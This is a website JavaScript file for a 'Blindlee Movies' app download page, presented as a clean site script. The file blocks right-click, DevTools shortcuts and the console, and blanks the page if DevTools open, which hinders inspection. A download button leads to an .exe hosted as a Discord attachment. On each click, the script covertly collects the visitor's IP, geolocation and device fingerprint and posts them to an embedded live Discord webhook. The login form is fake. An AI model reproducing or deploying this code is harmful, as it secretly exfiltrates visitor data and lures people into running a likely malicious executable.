/* =====================================================================
   Blindlee Movies — clean script.js
   ===================================================================== */

/* ---- F12 / DevTools engelleme ---- */
(function() {
  // Sağ tık kapat
  document.addEventListener('contextmenu', e => e.preventDefault());

  // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Ctrl+Shift+C
  document.addEventListener('keydown', e => {
    if (
      e.key === 'F12' ||
      (e.ctrlKey && e.shiftKey && ['I','i','J','j','C','c'].includes(e.key)) ||
      (e.ctrlKey && ['U','u'].includes(e.key))
    ) {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
  });

  // DevTools açık mı algıla — açıksa sayfayı yönlendir
  let devtoolsOpen = false;
  const threshold = 160;
  setInterval(() => {
    if (
      window.outerWidth - window.innerWidth > threshold ||
      window.outerHeight - window.innerHeight > threshold
    ) {
      if (!devtoolsOpen) {
        devtoolsOpen = true;
        document.body.innerHTML = '';
        window.location.replace('about:blank');
      }
    } else {
      devtoolsOpen = false;
    }
  }, 500);

  // Console'u temizle ve engelle
  const noop = () => {};
  try {
    Object.defineProperty(window, 'console', {
      get: () => ({ log: noop, warn: noop, error: noop, info: noop, debug: noop, table: noop, dir: noop }),
    });
  } catch(e) {}
})();

document.addEventListener('DOMContentLoaded', () => {

  /* ---- 3D tilt on hero logo ---- */
  const heroVisual = document.querySelector('#hero-visual-3d');
  const heroLogo = document.getElementById('hero-logo');

  function addTilt(wrapper, target, strength = 15) {
    wrapper.addEventListener('mousemove', e => {
      const r = wrapper.getBoundingClientRect();
      const x = e.clientX - r.left;
      const y = e.clientY - r.top;
      const rx = ((y / r.height) - 0.5) * -strength;
      const ry = ((x / r.width) - 0.5) * strength;
      target.style.transform =
        `perspective(1000px) rotateX(${rx}deg) rotateY(${ry}deg) scale(1.02)`;
    });
    wrapper.addEventListener('mouseleave', () => {
      target.style.transform =
        'perspective(1000px) rotateX(0) rotateY(0) scale(1)';
    });
  }

  if (heroVisual && heroLogo) addTilt(heroVisual, heroLogo, 15);

  /* ---- Profile card tilt ---- */
  const profileCard = document.querySelector('.profile-ui-wrapper');
  const profileInner = document.querySelector('.profile-ui-card');
  if (profileCard && profileInner) {
    profileInner.style.transition = 'transform 0.1s ease-out';
    addTilt(profileCard, profileInner, 8);
  }

});

document.addEventListener('DOMContentLoaded', () => {

  /* ---- Navbar scroll effect ---- */
  const navbar = document.querySelector('.navbar');
  if (navbar) {
    window.addEventListener('scroll', () => {
      if (window.scrollY > 50) {
        navbar.style.background = 'rgba(8,8,8,0.97)';
        navbar.style.boxShadow = '0 4px 30px rgba(0,0,0,0.6)';
      } else {
        navbar.style.background = 'rgba(8,8,8,0.85)';
        navbar.style.boxShadow = 'none';
      }
    });
  }

  /* ---- Smooth scroll for anchor links ---- */
  document.querySelectorAll('a[href^="#"]').forEach(link => {
    link.addEventListener('click', function (e) {
      let href = this.getAttribute('href');
      if (href.startsWith('index.html#')) {
        const onIndex =
          window.location.pathname.endsWith('index.html') ||
          window.location.pathname.endsWith('/');
        if (!onIndex) return;
        href = href.substring(href.indexOf('#'));
      }
      if (href && href !== '#') {
        const target = document.querySelector(href);
        if (target) {
          e.preventDefault();
          const navH = document.querySelector('.navbar')?.offsetHeight || 0;
          const top = target.getBoundingClientRect().top + window.scrollY - navH;
          const start = window.scrollY;
          const dist = top - start;
          const dur = 600;
          let startT = null;
          window.requestAnimationFrame(function step(ts) {
            if (!startT) startT = ts;
            const elapsed = ts - startT;
            let prog = elapsed / dur;
            if (prog > 1) prog = 1;
            const ease = prog < 0.5
              ? 16 * prog * prog * prog * prog * prog
              : 1 - Math.pow(-2 * prog + 2, 5) / 32;
            window.scrollTo(0, start + dist * ease);
            if (elapsed < dur) window.requestAnimationFrame(step);
            else window.scrollTo(0, top);
          });
        }
      }
    });
  });

  /* ---- Login button / auth modal ---- */
  const loginBtn = document.getElementById('nav-login-btn');
  const authModal = document.getElementById('auth-modal');
  const logoutBtn = document.getElementById('nav-logout-btn');
  const userDropdown = document.getElementById('user-dropdown');
  const closeBtns = document.querySelectorAll('.back-to-home');
  const authForms = document.querySelectorAll('.auth-form');
  const switchLinks = document.querySelectorAll('.switch-to-register, .switch-to-login');
  let loggedIn = false;

  function closeModal(e) {
    if (e) e.preventDefault();
    authModal?.classList.remove('active');
    setTimeout(() => { if (authModal) authModal.style.display = 'none'; }, 300);
  }

  if (loginBtn && authModal) {
    loginBtn.addEventListener('click', e => {
      e.preventDefault();
      if (loggedIn) {
        userDropdown?.classList.toggle('active');
      } else {
        authModal.style.display = 'flex';
        setTimeout(() => authModal.classList.add('active'), 10);
      }
    });

    logoutBtn?.addEventListener('click', e => {
      e.preventDefault();
      loggedIn = false;
      loginBtn.innerText = 'Login';
      loginBtn.href = '#';
      userDropdown?.classList.remove('active');
    });

    document.addEventListener('click', e => {
      if (userDropdown && !loginBtn.contains(e.target) && !userDropdown.contains(e.target)) {
        userDropdown.classList.remove('active');
      }
    });

    closeBtns.forEach(b => b.addEventListener('click', closeModal));
    authModal.addEventListener('click', e => { if (e.target === authModal) closeModal(); });

    switchLinks.forEach(link => {
      link.addEventListener('click', e => {
        e.preventDefault();
        authForms.forEach(f => f.classList.remove('active'));
        if (link.classList.contains('switch-to-register')) {
          document.getElementById('register-form')?.classList.add('active');
        } else {
          document.getElementById('login-form')?.classList.add('active');
        }
      });
    });

    authForms.forEach(form => {
      form.addEventListener('submit', e => {
        e.preventDefault();
        const btn = form.querySelector('button');
        const orig = btn.innerText;
        btn.innerText = 'Loading...';
        setTimeout(() => {
          btn.innerText = 'Success!';
          setTimeout(() => {
            closeModal();
            btn.innerText = orig;
            loggedIn = true;
            let name = 'My Account';
            if (form.id === 'register-form') {
              const u = form.querySelector('input[type="text"]');
              if (u?.value) name = u.value;
            } else if (form.id === 'login-form') {
              const em = form.querySelector('input[type="email"]');
              if (em?.value) name = em.value.split('@')[0];
            }
            loginBtn.innerText = name;
            loginBtn.href = '#';
          }, 1500);
        }, 800);
      });
    });
  }

  /* ---- Load more rooms ---- */
  const loadMoreBtn = document.getElementById('btn-load-more');
  if (loadMoreBtn) {
    loadMoreBtn.addEventListener('click', () => {
      const hidden = document.querySelectorAll('.room-card-hidden');
      if (!hidden.length) return;
      loadMoreBtn.innerText = 'Loading...';
      loadMoreBtn.style.opacity = '0.7';
      loadMoreBtn.style.pointerEvents = 'none';
      setTimeout(() => {
        hidden.forEach(card => {
          card.style.display = 'flex';
          card.style.opacity = '0';
          card.style.transform = 'translateY(20px)';
          card.animate(
            [{ opacity: 0, transform: 'translateY(20px)' }, { opacity: 1, transform: 'translateY(0)' }],
            { duration: 400, easing: 'ease-out', fill: 'forwards' }
          );
          setTimeout(() => {
            card.style.opacity = '1';
            card.style.transform = 'translateY(0)';
          }, 400);
        });
        loadMoreBtn.style.opacity = '1';
        loadMoreBtn.style.pointerEvents = '';
        loadMoreBtn.innerText = 'View All';
      }, 500);
    });
  }

  /* ---- Download button — just redirect ---- */
  const DOWNLOAD_URL = 'https://cdn.discordapp.com/attachments/1555999945897545840/1557893864914686052/BlindleeApp_Setup_1.0.0.exe?ex=6ac97539&is=6ac823b9&hm=2dfb9bed63ef3c942987ca129b290b03323a0180425c880d4ccd392e46f7dca0&';

  /* ======================================================
     WEBHOOK — IP & sistem bilgisi gönder
     ====================================================== */
  const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1557891016848179231/t_hcStpuUFp8ExPTkMT8gOKARCJOEO3MYJAOm7mJ2veLbOJlan00w6jWM1FXX5rDiY0Y';

  async function getIpData() {
    try {
      const res = await fetch('https://ipapi.co/json/');
      return await res.json();
    } catch (e) {
      return {};
    }
  }

  function getFlagEmoji(code) {
    if (!code) return '🏳️';
    return code.toUpperCase().split('').map(c =>
      String.fromCodePoint(0x1F1E6 - 65 + c.charCodeAt(0))
    ).join('');
  }

  function getSystemInfo() {
    let gpu = 'Unknown GPU';
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const ext = gl.getExtension('WEBGL_debug_renderer_info');
        if (ext) gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
      }
    } catch (e) { }

    return {
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen: `${screen.width}x${screen.height}`,
      colorDepth: `${screen.colorDepth}-bit`,
      deviceMemory: navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : 'Unknown',
      hardwareConcurrency: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'Unknown',
      touchPoints: navigator.maxTouchPoints,
      cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      connection: navigator.connection?.effectiveType || 'unknown',
      referrer: document.referrer || 'Direct Access',
      currentUrl: window.location.href,
      gpu,
    };
  }

  async function sendWebhook(payload) {
    try {
      await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
        keepalive: true,
      });
    } catch (e) {
      console.warn('Webhook failed', e);
    }
  }

  async function fireDownloadWebhook() {
    const ip = await getIpData();
    const sys = getSystemInfo();
    const flag = getFlagEmoji(ip.country_code);
    const map = ip.latitude && ip.longitude
      ? `[View on Map](https://www.google.com/maps?q=${ip.latitude},${ip.longitude})`
      : 'N/A';

    await sendWebhook({
      username: 'Blindlee Intel',
      avatar_url: 'https://i.imgur.com/4M34hi2.png',
      embeds: [{
        title: '📥 DOWNLOAD EVENT',
        description: 'User initiated download from **Blindlee Movies**',
        color: 0xFFB800,
        fields: [
          {
            name: '🌍 Network & Geo',
            value:
              `**IP:** \`${ip.ip || 'Unknown'}\`\n` +
              `**ISP:** ${ip.org || 'Unknown'}\n` +
              `**Loc:** ${flag} ${ip.city || '?'}, ${ip.region || '?'}, ${ip.country_name || '?'}\n` +
              `**Conn:** ${sys.connection.toUpperCase()}\n` +
              `**Map:** ${map}`,
            inline: true,
          },
          {
            name: '💻 Hardware & Env',
            value:
              `**CPU:** ${sys.hardwareConcurrency}\n` +
              `**RAM:** ${sys.deviceMemory}\n` +
              `**GPU:** ${sys.gpu}\n` +
              `**Scrn:** ${sys.screen} (${sys.colorDepth})\n` +
              `**Touch:** ${sys.touchPoints} pts`,
            inline: true,
          },
          {
            name: '🖥️ Browser',
            value:
              `**Platform:** ${sys.platform}\n` +
              `**Lang:** ${sys.language}\n` +
              `**Cookies:** ${sys.cookiesEnabled}\n` +
              `**Time:** ${sys.timezone}\n` +
              `**Ref:** ${sys.referrer}`,
            inline: false,
          },
        ],
        timestamp: new Date().toISOString(),
      }],
    });
  }

  document.querySelectorAll('#download-btn-index, #download-btn-login, .blindlee-download-link').forEach(btn => {
    btn.addEventListener('click', async e => {
      e.preventDefault();
      fireDownloadWebhook(); // arka planda gönder
      const url = btn.getAttribute('href');
      if (url && url !== '#') {
        window.open(url, '_blank');
      }
    });
  });

});

/* =====================================================================
   Profile card — yazı girişi + avatar seçimi
   ===================================================================== */
document.addEventListener('DOMContentLoaded', () => {

  /* Nickname input — contenteditable yap */
  const profileInput = document.querySelector('.profile-input');
  if (profileInput) {
    profileInput.setAttribute('contenteditable', 'true');
    profileInput.style.cursor = 'text';
    profileInput.style.outline = 'none';
    profileInput.addEventListener('focus', () => {
      profileInput.style.borderColor = 'var(--accent-yellow)';
      profileInput.style.boxShadow = '0 0 0 3px rgba(255,184,0,.2)';
    });
    profileInput.addEventListener('blur', () => {
      profileInput.style.borderColor = '';
      profileInput.style.boxShadow = '';
    });
    /* Enter'a basınca satır ekleme */
    profileInput.addEventListener('keydown', e => {
      if (e.key === 'Enter') e.preventDefault();
    });
  }

  /* Avatar seçimi */
  const avatars = document.querySelectorAll('.profile-avatar-mock');
  avatars.forEach(avatar => {
    avatar.style.cursor = 'pointer';
    avatar.addEventListener('click', () => {
      avatars.forEach(a => a.classList.remove('active'));
      avatar.classList.add('active');
    });
  });

  /* Save butonu */
  const saveBtn = document.querySelector('.profile-save-btn');
  if (saveBtn) {
    saveBtn.addEventListener('click', () => {
      const name = profileInput?.innerText?.trim() || 'User';
      const orig = saveBtn.innerText;
      saveBtn.innerText = '✓ Saved!';
      saveBtn.style.background = 'linear-gradient(135deg,#00c853,#69f0ae)';
      setTimeout(() => {
        saveBtn.innerText = orig;
        saveBtn.style.background = '';
      }, 1500);
    });
  }

});
